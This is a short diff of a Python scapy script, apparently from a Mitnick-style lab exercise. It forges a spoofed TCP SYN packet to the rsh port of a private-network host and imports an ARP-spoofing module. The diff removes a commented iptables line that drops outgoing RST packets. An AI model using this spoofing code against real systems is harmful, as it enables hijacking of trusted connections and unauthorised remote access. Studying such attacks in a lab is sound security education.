@@ -4,8 +4,6 @@ import scapy.all as scapy
 import multiprocessing
 import arpspoof
 
-#iptables -F && iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP && apt update && apt install ufw -y
-
 def manda_pacotes():
    # -----------------Manda pacote SYN-----------------
    pkt = scapy.IP(dst='10.9.0.5', src='10.9.0.6')/scapy.TCP(sport=1023, dport=514, flags='S', seq=1234)
